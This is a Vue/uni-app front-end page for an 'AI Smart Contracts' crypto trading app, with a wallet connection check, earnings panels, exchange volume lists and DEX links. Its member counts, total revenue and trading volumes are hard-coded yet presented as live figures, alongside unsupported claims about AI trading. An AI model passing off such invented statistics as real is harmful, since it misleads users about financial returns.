<template>
	<view class="index-container">
		<!-- 顶部渐变背景区域 -->
		<view class="gradient-bg">
			<view class="overlay-image-container">
				<image class="overlay-image"
					src="https://www.onchainus.net/static/media/img_banner.c2d112845c769829e979.png" mode="aspectFill">
				</image>
			</view>
		</view>

		<!-- 内容区域 -->
		<view class="content-container">
			<!-- 钱包状态 -->
			<view class="wallet-status-card" v-if="walletInfo.connected">
				<view class="wallet-status-header">
					<text class="wallet-type">{{ walletInfo.type }}</text>
					<text class="disconnect-btn" @click="disconnectWallet">断开连接</text>
				</view>
				<view class="wallet-address">
					<text class="address-label">钱包地址:</text>
					<text class="address-text">{{ formatAddress(walletInfo.address) }}</text>
				</view>
			</view>

			<!-- 欢迎卡片 -->
			<view class="welcome-card">
				<view class="welcome-header">
					<text class="welcome-title">Welcome to AI Smart Contracts</text>
					<view class="id-container">
						<text class="chain-icon">🔗</text>
						<text class="id-text">17d16003</text>
					</view>
				</view>
				<text class="welcome-subtitle">Artificial intelligence trading</text>
				
				<view class="earnings-section">
					<view class="earnings-item">
						<text class="earnings-label">Total earnings (USDT)</text>
						<text class="earnings-value">0.00</text>
					</view>
					<view class="earnings-item">
						<text class="earnings-label">Earnings 24h (USDT)</text>
						<text class="earnings-value">0.00</text>
					</view>
				</view>
				
				<view class="demo-btn">
					<text class="demo-text">DEMO</text>
				</view>
			</view>

			<!-- 开放交易卡片 -->
			<view class="transaction-card">
				<view class="transaction-header">
					<text class="transaction-title">Open transaction!</text>
					<view class="add-btn">
						<text class="add-text">+</text>
					</view>
				</view>
				<text class="transaction-subtitle">2000+ base factor library with AI support to short catch derivative position, one step ahead.</text>
				
				<view class="stats-section">
					<view class="stat-item">
						<text class="stat-label">Members people</text>
						<text class="stat-value">4958267</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Number of people</text>
						<text class="stat-value">4958267</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Total revenue</text>
						<text class="stat-value">338,475,366.25 USDT</text>
					</view>
				</view>
			</view>

			<!-- 交易所列表 -->
			<view class="exchange-list">
				<!-- binance -->
				<view class="exchange-item">
					<view class="exchange-header" @click="toggleExchange('binance')">
						<image class="exchange-icon" src="/static/c1.png" mode="aspectFit"></image>
						<text class="exchange-name">binance</text>
						<text class="exchange-value">2,479.46</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus.binance}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus.binance">
						<view class="detail-row">
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<view class="detail-row">
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">₿</text>
							<text class="coin-name">BitCoin</text>
							<text class="coin-value">$3,637,351,441.15</text>
							<text class="coin-number">932</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">Ξ</text>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">$1,842,444,173.81</text>
							<text class="coin-number">1046</text>
						</view>
					</view>
				</view>

				<!-- huobi -->
				<view class="exchange-item">
					<view class="exchange-header" @click="toggleExchange('huobi')">
						<image class="exchange-icon" src="/static/c2.png" mode="aspectFit"></image>
						<text class="exchange-name">huobi</text>
						<text class="exchange-value">2,479.45</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus.huobi}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus.huobi">
						<view class="detail-row">
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">₿</text>
							<text class="coin-name">BitCoin</text>
							<text class="coin-value">$676,616,185.61</text>
							<text class="coin-number">630</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">Ξ</text>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">$247,910,170.70</text>
							<text class="coin-number">719</text>
						</view>
					</view>
				</view>

				<!-- gate -->
				<view class="exchange-item">
					<view class="exchange-header" @click="toggleExchange('gate')">
						<image class="exchange-icon" src="/static/c3.png" mode="aspectFit"></image>
						<text class="exchange-name">gate</text>
						<text class="exchange-value">2,479.48</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus.gate}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus.gate">
						<view class="detail-row">
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">₿</text>
							<text class="coin-name">BitCoin</text>
							<text class="coin-value">$195,451,489.45</text>
							<text class="coin-number">623</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">Ξ</text>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">$143,372,131.23</text>
							<text class="coin-number">610</text>
						</view>
					</view>
				</view>

				<!-- okex -->
				<view class="exchange-item">
					<view class="exchange-header" @click="toggleExchange('okex')">
						<image class="exchange-icon" src="/static/c4.png" mode="aspectFit"></image>
						<text class="exchange-name">okex</text>
						<text class="exchange-value">2,479.36</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus.okex}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus.okex">
						<view class="detail-row">
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">₿</text>
							<text class="coin-name">BitCoin</text>
							<text class="coin-value">$969,434,481.24</text>
							<text class="coin-number">733</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">Ξ</text>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">$458,633,674.66</text>
							<text class="coin-number">869</text>
						</view>
					</view>
				</view>

				<!-- kucoin -->
				<view class="exchange-item">
					<view class="exchange-header" @click="toggleExchange('kucoin')">
						<image class="exchange-icon" src="/static/c5.png" mode="aspectFit"></image>
						<text class="exchange-name">kucoin</text>
						<text class="exchange-value">2,479.26</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus.kucoin}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus.kucoin">
						<view class="detail-row">
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">₿</text>
							<text class="coin-name">BitCoin</text>
							<text class="coin-value">$415,533,908.84</text>
							<text class="coin-number">729</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">Ξ</text>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">$155,629,615.74</text>
							<text class="coin-number">644</text>
						</view>
					</view>
				</view>

				<!-- kraken -->
				<view class="exchange-item">
					<view class="exchange-header" @click="toggleExchange('kraken')">
						<image class="exchange-icon" src="/static/c6.png" mode="aspectFit"></image>
						<text class="exchange-name">kraken</text>
						<text class="exchange-value">2,478.67</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus.kraken}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus.kraken">
						<view class="detail-row">
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">₿</text>
							<text class="coin-name">BitCoin</text>
							<text class="coin-value">$254,200,493.87</text>
							<text class="coin-number">880</text>
						</view>
						<view class="coin-row">
							<text class="coin-icon">Ξ</text>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">$147,708,233.85</text>
							<text class="coin-number">1098</text>
						</view>
					</view>
				</view>
			</view>

			<view class="external-links">
				<view class="external-card" @click="openExternalLink('https://1inch.io')">
					<view class="card-icon">
						<view class="svg-icon">
							<svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
								<circle cx="30" cy="30" r="28" fill="#1e3a8a" stroke="#1e3a8a" stroke-width="2"/>
								<path d="M25 20c0-2.5 2-4.5 4.5-4.5s4.5 2 4.5 4.5v5c2.5 0 4.5 2 4.5 4.5s-2 4.5-4.5 4.5h-4.5c-2.5 0-4.5-2-4.5-4.5V20z" fill="white"/>
								<path d="M30 35l8 8-8-8-8 8 8-8z" fill="white"/>
								<circle cx="28" cy="22" r="2" fill="#1e3a8a"/>
							</svg>
						</view>
					</view>
					<view class="card-content">
						<text class="card-title">1inch</text>
					</view>
				</view>
				<view class="external-card" @click="openExternalLink('https://uniswap.org')">
					<view class="card-icon">
						<view class="svg-icon">
							<svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
								<circle cx="30" cy="30" r="28" fill="#ff007a" stroke="#ff007a" stroke-width="2"/>
								<path d="M25 18c0-2.5 2-4.5 4.5-4.5s4.5 2 4.5 4.5v6c2.5 0 4.5 2 4.5 4.5s-2 4.5-4.5 4.5h-5c-2.5 0-4.5-2-4.5-4.5v-6.5z" fill="white"/>
								<path d="M30 35l-8 8 8-8 8 8-8-8z" fill="white"/>
								<circle cx="32" cy="21" r="2" fill="#ff007a"/>
								<path d="M28 28h4v4h-4z" fill="#ff007a"/>
							</svg>
						</view>
					</view>
					<view class="card-content">
						<text class="card-title">UniSwap</text>
					</view>
				</view>
				<view class="external-card" @click="openExternalLink('https://sushi.com')">
					<view class="card-icon">
						<view class="svg-icon">
							<svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
								<circle cx="30" cy="30" r="28" fill="#6366f1" stroke="#6366f1" stroke-width="2"/>
								<ellipse cx="30" cy="28" rx="12" ry="6" fill="white"/>
								<ellipse cx="30" cy="32" rx="10" ry="4" fill="#f59e0b"/>
								<ellipse cx="30" cy="35" rx="8" ry="3" fill="#10b981"/>
								<path d="M20 25c0-1 1-2 2-2h16c1 0 2 1 2 2v2c0 1-1 2-2 2H22c-1 0-2-1-2-2v-2z" fill="#ef4444"/>
								<circle cx="26" cy="24" r="1" fill="#6366f1"/>
								<circle cx="34" cy="24" r="1" fill="#6366f1"/>
							</svg>
						</view>
				</view>
				<view class="card-content">
						<text class="card-title">SushiSwap</text>
					</view>
				</view>
			</view>

			<!-- 交易所logos -->
			<view class="exchange-logos">
				<view class="logo-row">
					<view class="logo-item">
						<text class="logo-text">1inch</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">UniSwap</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">SushiSwap</text>
					</view>
				</view>
				<view class="logo-row">
					<view class="logo-item">
						<text class="logo-text">BITFINEX</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">FTX</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">Huobi</text>
					</view>
				</view>
				<view class="logo-row">
					<view class="logo-item">
						<text class="logo-text">BINANCE</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">GATE.IO</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">KUCOIN</text>
					</view>
				</view>
				<view class="logo-row">
					<view class="logo-item">
						<text class="logo-text">coinbase</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">OKEX</text>
					</view>
					<view class="logo-item">
						<text class="logo-text">kraken</text>
					</view>
				</view>
			</view>
		</view>


	</view>
</template>

<script>
export default {
	data() {
		return {
			exchangeStatus: {
				binance: true,  // 默认展开binance
				huobi: false,
				gate: false,
				okex: false,
				kucoin: false,
				kraken: false
			},
			walletInfo: {
				connected: false,
				type: '',
				address: ''
			}
		}
	},
	onLoad() {
		// 检查钱包连接状态
		this.checkWalletConnection();
	},
	methods: {
		// 检查钱包连接状态
		checkWalletConnection() {
			const walletConnected = uni.getStorageSync('walletConnected');
			const walletAddress = uni.getStorageSync('walletAddress');
			const walletType = uni.getStorageSync('walletType');
			
			if (!walletConnected || !walletAddress) {
				// 未连接钱包，跳转到连接页面
				uni.reLaunch({
					url: '/pages/wallet/connect'
				});
			} else {
				// 已连接，加载钱包信息
				this.walletInfo = {
					connected: true,
					type: walletType || 'Unknown',
					address: walletAddress
				};
			}
		},
		
		// 格式化钱包地址
		formatAddress(address) {
			if (!address) return '';
			if (address.length <= 10) return address;
			return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
		},
		
		// 断开钱包连接
		disconnectWallet() {
			uni.showModal({
				title: '断开连接',
				content: '确定要断开钱包连接吗？',
				success: (res) => {
					if (res.confirm) {
						// 清除本地存储
						uni.removeStorageSync('walletConnected');
						uni.removeStorageSync('walletAddress');
						uni.removeStorageSync('walletType');
						uni.removeStorageSync('connectTime');
						
						// 跳转到连接页面
						uni.reLaunch({
							url: '/pages/wallet/connect'
						});
					}
				}
			});
		},
		
		toggleExchange(exchangeName) {
			this.exchangeStatus[exchangeName] = !this.exchangeStatus[exchangeName];
		},
		openExternalLink(url) {
			// 在小程序中打开外部链接
			// #ifdef MP-WEIXIN
			uni.navigateTo({
				url: `/pages/webview/webview?url=${encodeURIComponent(url)}`
			});
			// #endif
			
			// 在APP中打开外部链接
			// #ifdef APP-PLUS
			plus.runtime.openURL(url);
			// #endif
			
			// 在H5中打开外部链接
			// #ifdef H5
			window.open(url, '_blank');
			// #endif
		}
	}
}
</script>

<style>
.index-container {
	min-height: 100vh;
	background-color: #f5f5f5;
	position: relative;
}

.gradient-bg {
	position: relative;
	top: 0;
	left: 0;
	right: 0;
	height: 50vh;
	background: linear-gradient(to bottom, #094884, white);
	z-index: 0;
}

.overlay-image-container {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	height: 25vh;
	z-index: 1;
	display: flex;
	justify-content: center;
	align-items: flex-start;
	overflow: hidden;
}

.overlay-image {
	width: 100%;
	height: 100%;
	object-fit: cover;
	object-position: top;
	margin-top: 0;
	display: block;
}



.content-container {
	position: relative;
	z-index: 2;
	margin: 0 30rpx;
	margin-top: -25vh;
	padding: 40rpx;
	background-color: #ffffff;
	border-radius: 20rpx 20rpx 0 0;
	box-shadow: 0 -4rpx 20rpx rgba(0, 0, 0, 0.1);
	min-height: 70vh;
}

.wallet-status-card {
	background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
	border-radius: 15rpx;
	padding: 30rpx;
	margin-bottom: 30rpx;
	box-shadow: 0 4rpx 12rpx rgba(76, 175, 80, 0.3);
}

.wallet-status-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 20rpx;
}

.wallet-type {
	font-size: 28rpx;
	font-weight: bold;
	color: white;
}

.disconnect-btn {
	font-size: 22rpx;
	color: white;
	background-color: rgba(255, 255, 255, 0.2);
	padding: 10rpx 20rpx;
	border-radius: 20rpx;
	cursor: pointer;
}

.wallet-address {
	display: flex;
	align-items: center;
}

.address-label {
	font-size: 24rpx;
	color: rgba(255, 255, 255, 0.8);
	margin-right: 15rpx;
}

.address-text {
	font-size: 24rpx;
	color: white;
	font-family: monospace;
	background-color: rgba(255, 255, 255, 0.1);
	padding: 5rpx 15rpx;
	border-radius: 10rpx;
}

.welcome-card {
	margin-bottom: 40rpx;
}

.welcome-header {
	display: flex;
	justify-content: space-between;
	align-items: flex-start;
	margin-bottom: 20rpx;
}

.welcome-title {
	font-size: 32rpx;
	font-weight: bold;
	color: #333;
	flex: 1;
}

.id-container {
	display: flex;
	align-items: center;
}

.chain-icon {
	font-size: 24rpx;
	margin-right: 10rpx;
}

.id-text {
	font-size: 24rpx;
	color: #999;
}

.welcome-subtitle {
	font-size: 26rpx;
	color: #666;
	margin-bottom: 40rpx;
}

.earnings-section {
	display: flex;
	justify-content: space-between;
	margin-bottom: 40rpx;
}

.earnings-item {
	flex: 1;
}

.earnings-label {
	font-size: 24rpx;
	color: #999;
	display: block;
	margin-bottom: 10rpx;
}

.earnings-value {
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
}

.demo-btn {
	background-color: #4A90E2;
	border-radius: 12rpx;
	padding: 20rpx 0;
	text-align: center;
}

.demo-text {
	color: white;
	font-size: 28rpx;
	font-weight: bold;
}

.transaction-card {
	background-color: #FF9A56;
	border-radius: 20rpx;
	padding: 40rpx;
	margin-bottom: 40rpx;
	position: relative;
}

.transaction-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 20rpx;
}

.transaction-title {
	font-size: 32rpx;
	font-weight: bold;
	color: white;
}

.add-btn {
	width: 60rpx;
	height: 60rpx;
	background-color: rgba(255, 255, 255, 0.3);
	border-radius: 50%;
	display: flex;
	justify-content: center;
	align-items: center;
}

.add-text {
	color: white;
	font-size: 32rpx;
	font-weight: bold;
}

.transaction-subtitle {
	font-size: 24rpx;
	color: white;
	margin-bottom: 30rpx;
	opacity: 0.9;
}

.stats-section {
	display: flex;
	justify-content: space-between;
	flex-wrap: wrap;
}

.stat-item {
	width: 48%;
	margin-bottom: 20rpx;
}

.stat-label {
	font-size: 22rpx;
	color: white;
	opacity: 0.8;
	display: block;
	margin-bottom: 8rpx;
}

.stat-value {
	font-size: 24rpx;
	color: white;
	font-weight: bold;
}

.exchange-list {
	margin-bottom: 40rpx;
}

.exchange-item {
	background-color: white;
	border-radius: 16rpx;
	margin-bottom: 20rpx;
	overflow: hidden;
	box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.08);
}

.exchange-header {
	display: flex;
	align-items: center;
	padding: 30rpx;
	cursor: pointer;
	transition: background-color 0.3s ease;
}

.exchange-header:hover {
	background-color: #f8f9fa;
}

.exchange-item:not(:last-child) {
	border-bottom: 1px solid #f0f0f0;
}

.exchange-icon {
	width: 48rpx;
	height: 48rpx;
	margin-right: 20rpx;
}

.exchange-name {
	font-size: 28rpx;
	color: #333;
	flex: 1;
}

.exchange-value {
	font-size: 28rpx;
	color: #333;
	font-weight: bold;
	margin-right: 20rpx;
}

.exchange-arrow {
	font-size: 24rpx;
	color: #999;
	transition: transform 0.3s ease;
}

.exchange-arrow.rotated {
	transform: rotate(90deg);
}

.exchange-details {
	padding: 20rpx 30rpx;
	animation: slideDown 0.3s ease-out;
	border-top: 1px solid #f0f0f0;
	background-color: #fafafa;
}

@keyframes slideDown {
	from {
		max-height: 0;
		opacity: 0;
		padding-top: 0;
		padding-bottom: 0;
	}
	to {
		max-height: 300rpx;
		opacity: 1;
		padding-top: 20rpx;
		padding-bottom: 20rpx;
	}
}

.detail-row {
	display: flex;
	justify-content: space-between;
	margin-bottom: 15rpx;
}

.detail-label {
	font-size: 22rpx;
	color: #666;
	flex: 1;
}

.coin-row {
	display: flex;
	align-items: center;
	margin-bottom: 15rpx;
}

.coin-icon {
	width: 32rpx;
	height: 32rpx;
	margin-right: 15rpx;
	font-size: 24rpx;
	text-align: center;
}

.coin-name {
	font-size: 24rpx;
	color: #333;
	flex: 1;
}

.coin-value {
	font-size: 22rpx;
	color: #666;
	margin-right: 20rpx;
}

.coin-number {
	font-size: 22rpx;
	color: #666;
}

.exchange-logos {
	margin-bottom: 40rpx;
}

.logo-row {
	display: flex;
	justify-content: space-between;
	margin-bottom: 30rpx;
}

.logo-item {
	width: 200rpx;
	height: 80rpx;
	background-color: white;
	border-radius: 12rpx;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 2rpx 8rpx rgba(0, 0, 0, 0.1);
}

.logo-text {
	font-size: 20rpx;
	color: #333;
	font-weight: bold;
}

.external-links {
	display: flex;
	justify-content: space-between;
	margin-bottom: 80rpx;
	padding: 0 10rpx;
}

.external-card {
	width: 200rpx;
	height: 160rpx;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	border-radius: 20rpx;
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	box-shadow: 0 8rpx 24rpx rgba(255, 165, 0, 0.3);
	cursor: pointer;
	transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.external-card:hover {
	transform: translateY(-5rpx);
	box-shadow: 0 12rpx 32rpx rgba(255, 165, 0, 0.4);
}

.card-icon {
	width: 80rpx;
	height: 80rpx;
	margin-bottom: 20rpx;
	background-color: white;
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.1);
}

.svg-icon {
	width: 60rpx;
	height: 60rpx;
	display: flex;
	align-items: center;
	justify-content: center;
}

.svg-icon svg {
	width: 100%;
	height: 100%;
}

.card-content {
	text-align: center;
}

.card-title {
	font-size: 24rpx;
	font-weight: bold;
	color: white;
	text-shadow: 0 2rpx 4rpx rgba(0, 0, 0, 0.2);
}


</style>
